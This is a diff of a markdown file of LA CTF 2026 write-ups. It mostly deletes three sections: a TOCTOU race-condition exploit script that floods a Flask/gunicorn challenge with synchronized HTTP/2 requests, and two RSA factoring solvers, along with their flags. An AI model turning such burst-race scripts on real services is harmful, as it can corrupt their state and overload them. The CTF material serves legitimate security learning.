@@ -51,6 +51,7 @@ A collection of all my solutions from LA CTF 2026, organized by category.
 
 
 
+
 Remote target:
 
 
@@ -890,315 +891,6 @@ if __name__ == "__main__":
 ---
 
 
-### [crypto] misdirection
-
-
-
-> A crypto-themed service where the real break is a thread race on shared state, amplified with HTTP/2 concurrency.
-
-### Overview
-
-| Item | Value |
-|------|-------|
-| Platform | laCTF |
-| Event | laCTF 2026 |
-| Category | crypto |
-| Difficulty | ★★★☆☆ |
-| Date | 2026-02-07 |
-| Flag | `lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}` |
-
-### Problem Statement
-
-> To win the game, answer the riddle: what's inconveniently long and full of misdirection?
->
-> Deploy challenge (https://instancer.lac.tf/chall/misdirection?token=LTwieYb%2BSCVF0IyNtLpQpCfkcLsFOWcBuQ4VUVHX7DNkCNF4fqnQo1e9REji8KaV4sJGEpGYUISseJoOUOZNWFkZA6qxScf8papRoT90zstdDo1BQLji1vPD5EYONCN6B76VEWwn%2FV8xmCxTyFxJ%2BAww%2F3P9kc7KQtrIaN9XHeAdTkuAl1ZJUejg%2BbkzNpAnBk7frcBxcYlG)
->
-> https://misdirection-simkv.instancer.lac.tf/
-
-
-
-
-Remote target:
-
-
-### TL;DR
-
-- `POST /grow` checks `current_count < 4` and `client_count == current_count` without a lock, creating a TOCTOU race.
-- If many concurrent requests pass this check while `current_count == 3`, each valid request increments `current_count`, so it can jump far above `4`.
-- A string-modified but still valid signature avoids relying on exact cache keys and keeps verification valid.
-- Sending a large synchronized HTTP/2 burst at count `3` pushed count to `26`, then `POST /flag` returned the flag.
-
-### Background Knowledge
-
-#### 1. TOCTOU races in threaded web handlers
-
-TOCTOU means Time-Of-Check-To-Time-Of-Use. If shared data is checked and later updated without a lock, concurrent requests can all pass the same check before any one update is visible.
-
-In this challenge, `current_count` is global mutable state. The route checks it, then verifies a signature, then increments it. Without synchronization, multiple threads can read the same old value and all increment.
-
-#### 2. Why this challenge appears crypto-first
-
-The app wraps growth with an NTRUSign signature verification routine. That suggests a cryptographic break is required, but the signature scheme itself was not the practical weakness here. The bug was in state management around the verification process.
-
-#### 3. Gunicorn threading and race windows
-
-`Dockerfile` runs:
-
-```dockerfile
-CMD ["gunicorn", "-w", "1", "-k", "gthread", "--threads", "80", "-b", "0.0.0.0:8000", "app:app"]
-```
-
-One worker process with many threads increases race opportunities on shared globals.
-
-### Solution
-
-#### Step 1: Initial Reconnaissance
-
-I started with archive and source triage.
-
-```bash
-cd /home/archcat/Documents/CTF/lac_2026/crypto/misdirection
-ls -la
-file app dist.tar.gz question.txt
-tar -tzf dist.tar.gz | sed -n '1,80p'
-```
-
-Output (trimmed):
-
-```text
-app: directory
-dist.tar.gz: gzip compressed data
-question.txt: ASCII text
-
-app/app.py
-app/NTRUSign/NTRU.py
-app/NTRUSign/Polynomial.py
-app/Dockerfile
-...
-```
-
-Then I read `app/app.py` and found the core game logic.
-
-Key code facts:
-
-- `current_count` is global.
-- `/grow` allows action only if `current_count < 4` and `client_count == current_count`.
-- Signature is verified, then `current_count += 1`.
-- `/flag` requires `current_count >= 14`.
-
-Relevant snippet (`app/app.py`):
-
-```python
-if current_count < 4 and client_count == current_count:
-    ... verify signature ...
-    if verif:
-        current_count += 1
-        ... sign new count ...
-
-if current_count >= 14:
-    return jsonify({"msg": f"Flag: {flag}", ...})
-```
-
-#### Step 2: Vulnerability Analysis
-
-The challenge is intentionally misleading: crypto primitives are present, but the exploit is a race condition.
-
-Why the race works:
-
-1. Multiple threads read `current_count == 3` at nearly the same time.
-2. All pass `current_count < 4` and `client_count == current_count`.
-3. Each thread verifies signature and executes `current_count += 1`.
-4. Net effect: `current_count` can jump from `3` to `10+` or even `20+` before checks catch up.
-
-Important detail:
-
-- The server has a `signature_cache` keyed by exact signature string. Using the exact string can take the cache fast path (`verif = True` immediately).
-- I used a *different string representation* of the same signature body so it is not cache-hit by string key, but still parses and verifies correctly via `NTRU.import_signature` and `NTRU.Verifying`.
-
-Validation I performed:
-
-```text
-zero verify: True
-mod verify: True
-same string: False
-```
-
-So modified signature text remained valid while bypassing exact cache-string lookup.
-
-#### Step 3: Exploit Development
-
-I tested several concurrency strategies; the reliable one was HTTP/2 with many simultaneous streams from one client.
-
-Exploit script (final approach):
-
-```python
-##!/usr/bin/env python3
-import asyncio
-import time
-import httpx
-
-BASE = "https://misdirection-simkv.instancer.lac.tf"
-
-
-def modsig(sig: str) -> str:
-    # Keep coeff/r intact but change wrapper lines so cache key differs.
-    lines = sig.split("\n")
-    return "X\n" + lines[1] + "\n" + lines[2] + "\nZ\n"
-
-
-async def wait_ready(client: httpx.AsyncClient, timeout_s: int = 1800) -> bool:
-    start = time.time()
-    while time.time() - start < timeout_s:
-        try:
-            r = await client.get("/status")
-            if r.status_code == 200 and r.json().get("status") is True:
-                return True
-        except Exception:
-            pass
-        await asyncio.sleep(1)
-    return False
-
-
-async def grow(client: httpx.AsyncClient, count: int, sig: str, timeout: float = 300.0):
-    r = await client.post("/grow", json={"count": count, "sig": sig}, timeout=timeout)
-    r.raise_for_status()
-    return r.json()
-
-
-async def burst_count3(client: httpx.AsyncClient, sig3: str, n: int):
-    payload = {"count": 3, "sig": modsig(sig3)}
-    gate = asyncio.Event()
-
-    async def one():
-        await gate.wait()
-        try:
-            r = await client.post("/grow", json=payload, timeout=400.0)
-            return r.status_code == 200
-        except Exception:
-            return False
-
-    tasks = [asyncio.create_task(one()) for _ in range(n)]
-    await asyncio.sleep(0.05)
-    gate.set()
-    results = await asyncio.gather(*tasks)
-    ok = sum(1 for x in results if x)
-    return ok, n - ok
-
-
-async def main():
-    # Single HTTP/2 connection; many concurrent streams.
-    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
-    async with httpx.AsyncClient(base_url=BASE, http2=True, limits=limits, timeout=60.0) as client:
-        print("protocol:", (await client.get("/status")).http_version)
-
-        # Retry with larger bursts until count >= 14.
-        for burst_size in [200, 500, 900, 1400, 2000]:
-            print(f"[*] Burst size {burst_size}")
-
-            await wait_ready(client)
-            await client.get("/regenerate-keys", timeout=900.0)
-            await wait_ready(client)
-
-            # Legitimate growth to 3 to obtain sig for count 3.
-            sig = (await client.get("/zero-signature", timeout=120.0)).json()["signature"]
-            sig = (await grow(client, 0, sig, timeout=420.0))["signature"]
-            sig = (await grow(client, 1, sig, timeout=420.0))["signature"]
-            sig = (await grow(client, 2, sig, timeout=420.0))["signature"]
-
-            ok, err = await burst_count3(client, sig, burst_size)
-            print(f"    burst done: ok={ok} err={err}")
-
-            await wait_ready(client, timeout_s=3600)
-            cnt = (await client.get("/current-count", timeout=120.0)).json()["count"]
-            print("    count:", cnt)
-
-            if cnt >= 14:
-                flag_resp = (await client.post("/flag", json={}, timeout=120.0)).json()
-                print(flag_resp)
-                return
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
-```
-
-Why this script works:
-
-- It deterministically gets a valid signature for count `3`.
-- It sends many requests that all claim `count=3` nearly simultaneously.
-- Enough requests pass the stale check before `current_count` moves beyond gate conditions.
-
-#### Step 4: Capturing the Flag
-
-Final successful run output:
-
-```text
-protocol HTTP/2 {"status":true}
-
-=== attempt 1 burst=200 ===
-regen {"msg":"Successfully Reset Challenge"}
-...
-burst done ok 200 err 0 sec 10.71
-count 10
-
-=== attempt 2 burst=500 ===
-regen {"msg":"Successfully Reset Challenge"}
-...
-burst done ok 494 err 6 sec 51.1
-count 26
-FLAG_RESPONSE {'count': 12, 'msg': 'Flag: lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}'}
-```
-
-Captured flag:
-
-```text
-lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}
-```
-
-### Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| `sed`, `nl`, `tar`, `file` | Fast static triage of challenge artifacts |
-| Python `urllib` | Early endpoint testing and signature validation |
-| Python `httpx` (HTTP/2) | High-concurrency exploit delivery with synchronized bursts |
-| Local source inspection | Confirming race in `app.py` and thread model in `Dockerfile` |
-
-### Lessons Learned
-
-#### What I Learned
-
-- Crypto-heavy code can still be broken by plain concurrency bugs.
-- HTTP/2 multiplexing can materially improve race exploit reliability compared to naive thread-per-request approaches.
-- A challenge can include a valid cryptographic path while the intended exploit lives in surrounding state logic.
-
-#### Mistakes Made
-
-- I initially over-focused on cryptographic manipulation before proving race reliability.
-- Too-large uncontrolled bursts temporarily overloaded the backend and reduced signal.
-- I spent time on signature inflation ideas that were not necessary once HTTP/2 burst timing was tuned.
-
-#### Future Improvements
-
-- Build a reusable race harness with adaptive burst sizing and server health backoff.
-- Add per-request timing instrumentation to quantify winning windows.
-- Practice controlled load testing patterns for CTF web+crypto hybrids.
-
-### References
-
-- [NTRUSign repository (referenced by challenge source)](https://github.com/Taumille/NTRUSign) - Upstream implementation basis.
-- [Flask documentation](https://flask.palletsprojects.com/) - Request handling and threading context.
-- [Gunicorn design docs](https://docs.gunicorn.org/en/stable/design.html) - Worker/thread model behavior.
-- [HTTPX documentation](https://www.python-httpx.org/) - HTTP/2 async client used for exploit bursts.
-
-### Tags
-
-`crypto` `race-condition` `toctou` `threading` `http2` `ntrusign` `flask` `gunicorn` `lactf`
-
-
----
-
-
 ### [crypto] not-so-lazy-trigrams
 
 
@@ -1208,6 +900,7 @@ lactf{d0nt_b3_n0nc00p3r4t1v3_w1th_my_s3rv3r}
 > Finally got the energy to write a trigram substitution cipher. Surely three shuffles are better than one!
 
 Given 
+
 
 - `solver.py` (partial/incorrect attempt)
 
@@ -1418,160 +1111,6 @@ print(decode_full(best_key))
 ---
 
 
-### [crypto] six seven
-
-
-> Factoring RSA primes composed only of digits 6 and 7.
-
-### Overview
-
-| Field | Value |
-|-------|-------|
-| Challenge | six seven |
-| Category | Crypto |
-| Platform | LA CTF 2026 |
-| Points | N/A |
-| Solves | N/A |
-| Level | Easy |
-
-### Problem Statement
-The challenge provides an RSA public key $n$ and a ciphertext $c$. The primes $p$ and $q$ used to generate $n$ are 256 digits long and consist only of the digits '6' and '7'.
-
-
-- `chall.py`: The script used to generate the parameters.
-- `question.txt`: Hint and connection information.
-
-Connection info: `nc chall.lac.tf 31180`
-
-### TL;DR
-- Primes $p$ and $q$ are restricted to digits '6' and '7'.
-- Use a digit-by-digit backtracking algorithm to factor $n$.
-- Start from the least significant digit (LSD) and solve for $p \pmod{10^k}$ and $q \pmod{10^k}$.
-- Once $p$ and $q$ are found, compute $d$ and decrypt the ciphertext.
-
-### Background Knowledge
-#### RSA Encryption
-RSA relies on the difficulty of factoring a large number $n = p \times q$. If we know $p$ and $q$, we can calculate $\phi(n) = (p-1)(q-1)$ and then the private exponent $d = e^{-1} \pmod{\phi(n)}$.
-
-#### Restricted Digit Factoring
-When primes are known to have specific properties, like being composed of a limited set of digits, the search space for factors is significantly reduced. Instead of $10^{256}$ possibilities, we have $2^{256}$ for each prime. However, $2^{256}$ is still too large for brute force. We can use the fact that $(p \pmod{10^k}) \times (q \pmod{10^k}) \equiv n \pmod{10^k}$ to determine the digits one by one.
-
-### Solution Step 1: Initial Reconnaissance
-Reading `chall.py` reveals the prime generation logic:
-
-```python
-def generate_67_prime(length: int) -> int:
-    while True:
-        digits = [secrets.choice("67") for _ in range(length - 1)]
-        digits.append("7")
-
-        test = int("".join(digits))
-        if isPrime(test, false_positive_prob=1e-12):
-            return test
-```
-
-Each prime is 256 digits long, ending in '7', and contains only '6's and '7's.
-
-### Solution Step 2: Vulnerability Analysis
-The multiplication of two numbers can be viewed digit by digit.
-If $p = \sum p_i 10^i$ and $q = \sum q_i 10^i$, then:
-$n \equiv p \times q \pmod{10^k}$ depends only on the first $k$ digits of $p$ and $q$.
-
-For $k=1$:
-$p \equiv 7 \pmod{10}$
-$q \equiv 7 \pmod{10}$
-$p \times q \equiv 49 \equiv 9 \pmod{10}$
-This matches $n \pmod{10}$.
-
-For $k+1$:
-Suppose we know $P_k = p \pmod{10^k}$ and $Q_k = q \pmod{10^k}$.
-Then $p \pmod{10^{k+1}} = P_k + p_k 10^k$ where $p_k \in \{6, 7\}$.
-$q \pmod{10^{k+1}} = Q_k + q_k 10^k$ where $q_k \in \{6, 7\}$.
-We check which pairs $(p_k, q_k)$ satisfy:
-$(P_k + p_k 10^k)(Q_k + q_k 10^k) \equiv n \pmod{10^{k+1}}$
-
-### Solution Step 3: Exploit Development
-We implement a backtracking search to find the digits of $p$ and $q$.
-
-```python
-import sys
-from Crypto.Util.number import long_to_bytes, bytes_to_long
-
-def solve():
-    n = ... # value from server
-    c = ... # value from server
-    e = 65537
-
-    def backtrack(current_p, current_q, k):
-        if k == 256:
-            if current_p * current_q == n:
-                return current_p, current_q
-            return None
-        
-        mod = 10**(k+1)
-        target = n % mod
-        
-        for pi in [6, 7]:
-            for qi in [6, 7]:
-                next_p = current_p + pi * (10**k)
-                next_q = current_q + qi * (10**k)
-                if (next_p * next_q) % mod == target:
-                    res = backtrack(next_p, next_q, k + 1)
-                    if res:
-                        return res
-        return None
-
-    res = backtrack(7, 7, 1)
-    if res:
-        p, q = res
-        phi = (p - 1) * (q - 1)
-        d = pow(e, -1, phi)
-        m = pow(c, d, n)
-        print(long_to_bytes(m).decode())
-```
-
-### Solution Step 4: Flag Capture
-Running the solver yields the factors and the flag.
-
-**Output:**
-```
-p = 7666667666776676776766767777766676666766777777776766767676676767767677666676766776666767766766776776777777677667667776667676676667767667667766767667676677776767666667766766766776667766767766667776777666676676766776676677776776766676676776766676666677666767
-q = 6767676667767676667666667767767676777666677676666677777676767667667666776767766676777667677667777666667666676676777667667767677676777777777667676677666777676766777666666767677667776767666767667667676666677677676667766667766677767676667666676776766677677677
-lactf{wh4t_67s_15_blud_f4ct0r1ng_15_blud_31nst31n}
-```
-
-**Flag:**
-`lactf{wh4t_67s_15_blud_f4ct0r1ng_15_blud_31nst31n}`
-
-### Tools Used
-| Tool | Purpose |
-|------|---------|
-| Python | Scripting and solving |
-| PyCryptodome | RSA operations and number theory |
-| Netcat | Connecting to the challenge server |
-
-### Lessons Learned
-#### What I Learned
-- RSA factorization can be efficient if the primes belong to a small subset of integers that can be explored digit by digit.
-- Backtracking is a powerful technique for solving equations over $\mathbb{Z}/10^k\mathbb{Z}$.
-
-#### Mistakes Made
-- Initially forgot to handle the Proof of Work (PoW) manually, but automated it with a script.
-
-#### Future Improvements
-- The solver could be generalized to handle any small set of digits.
-
-### References
-- [RSA Cryptosystem](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
-- [Backtracking Algorithms](https://en.wikipedia.org/wiki/Backtracking)
-
-### Tags
-##crypto #rsa #backtracking #lactf2026
-
-
----
-
-
 ### [crypto] six seven again
 
 
@@ -1599,7 +1138,7 @@ The prime $q$ is a standard random 670-bit prime.
 
 ****
 - `chall.py`: Generation script showing the structure.
-- `question.txt`: Server connection info (requires PoW).
+
 
 ### TL;DR
 - The prime $p$ has 201 digits, and we know the top 67 and bottom 67 digits.
@@ -1813,6 +1352,7 @@ The flag refers to the bit lengths:
 
 
 
+
 Server/client pointers from `dist/README.md`:
 
 - Server logic: `emp-zk/test/arith/chall.cpp`
@@ -1862,7 +1402,7 @@ After deriving evaluations of a hidden degree-9 polynomial in `GF(p)`, we interp
 I first confirmed challenge metadata and located server/client code.
 
 ```bash
-cat question.txt
+
 ```
 
 Output:
@@ -2192,65 +1732,6 @@ lactf{1_h0p3_y0u_l1v3_th1s_0ne_t0_th3_fullest}
 ---
 
 
-### [crypto] smol cats
-
-
-
-### Challenge Description
-The challenge presents an RSA implementation created by a "cat" using "tiny primes." We are given a remote service to connect to, which provides the public key $(n, e)$ and a ciphertext $c$, and asks for the decrypted message $m$.
-
-### Analysis
-The security of RSA depends on the difficulty of factoring the modulus $n$. If $n$ is small enough to be factored, we can calculate $\phi(n) = (p-1)(q-1)$, determine the private exponent $d = e^{-1} \pmod{\phi(n)}$, and decrypt the ciphertext using $m = c^d \pmod n$.
-
-In this challenge, $n$ is approximately $10^{60}$ (around 200 bits). While much larger than textbook examples, this size is trivial for modern factoring algorithms.
-
-### Solution Path
-1.  **Connect to the service**: Use `nc` or a script to retrieve the values of $n, e, c$.
-2.  **Factor $n$**: Use a tool like `sympy.factorint` or an online database like `factordb.com` to find the prime factors $p$ and $q$.
-3.  **Calculate $d$**: Compute the modular inverse of $e$ modulo $(p-1)(q-1)$.
-4.  **Decrypt $c$**: Compute $m = c^d \pmod n$.
-5.  **Submit $m$**: Send the resulting integer back to the service to receive the flag.
-
-### Solver Script
-```python
-from pwn import *
-from sympy import factorint
-
-
-r = remote("chall.lac.tf", 31224)
-
-
-output = r.recvuntil(b"How many treats do I want?").decode()
-lines = output.split("\n")
-n = int([line for line in lines if "n = " in line][0].split("=")[1].strip())
-e = int([line for line in lines if "e = " in line][0].split("=")[1].strip())
-c = int([line for line in lines if "c = " in line][0].split("=")[1].strip())
-
-
-factors = factorint(n)
-p, q = list(factors.keys())
-
-
-phi = (p - 1) * (q - 1)
-d = pow(e, -1, phi)
-
-
-m = pow(c, d, n)
-
-
-r.sendline(str(m).encode())
-
-
-print(r.recvall().decode())
-```
-
-### Flag
-`lactf{sm0l_pr1m3s_4r3_n0t_s3cur3}`
-
-
----
-
-
 ### [crypto] the-clock
 
 
@@ -2261,7 +1742,7 @@ The challenge provides a "clock" group implementation over a finite field. We ar
 ### 
 - `chall.py`: The implementation of the clock group and the DH exchange.
 - `output.txt`: Public keys and the encrypted flag.
-- `question.txt`: A hint: "Don't run out of time".
+
 
 ### Analysis
 
@@ -2405,6 +1886,7 @@ print(unpad(AES.new(key, AES.MODE_ECB).decrypt(enc_flag), 16).decode())
 > Note: if the game isn't working locally on linux, try running `export TERM=xterm-256color`
 
 Given 
+
 
 Goal: produce a game state equal to the hardcoded `winning_board`, which prints the flag.
 
@@ -2672,11 +2154,11 @@ The win path is deterministic once a valid short pair is available and forged pa
 
 - Category: Reverse Engineering
 - Name: `flag-finder`
-- Provided file: `question.txt`
+
 - Remote target: `https://flag-finder.chall.lac.tf/`
 -  `lactf{...}`
 
-`question.txt` only gives a short prompt and the challenge URL, so the solve path is mostly web + regex RE.
+
 
 ---
 
@@ -2819,6 +2301,7 @@ lactf{Wh47_d0_y0u_637_wh3n_y0u_cr055_4_r363x_4nd_4_n0n06r4m?_4_r363x06r4m!}
 
 Challenge 
 - `helm-hell/` (a Helm chart directory)
+
 
 
 
@@ -3113,7 +2596,7 @@ for s in range(0x100000):
 
 
 ### Challenge Overview
-We are provided with a Python script `ooo.py` and a `question.txt`.
+
 The script asks for a flag and verifies it against a hardcoded list of integers using various functions with visually similar names (homoglyphs like `о`, `ο`, `օ`).
 
 ### Analysis
@@ -3320,6 +2803,7 @@ Paste the printed sequence (it’s one long line ending in `f`). The service sho
 
 
 ### [rev] the-fish
+
 
 
 
@@ -3599,6 +3083,7 @@ python3 rev/the-three-sat-problem/solve.py
 
 
 
+
  `lactf{...}`
 
 ### Recon / Observations
@@ -3678,6 +3163,7 @@ Note: `s.encode("utf-16le").decode("utf-16be")` also works here; either directio
 ### Prompt
 
 > Inspired by CS 131 Programming Languages, I decided to make a context-free grammar in EBNF for my flag! But it looks like some squirrels have eaten away at the parse tree...
+
 
 
 
@@ -3814,6 +3300,7 @@ Putting it together with the fixed `start`, underscores, and `end`:
 
 
 ### 
+
 
 
 ### TL;DR
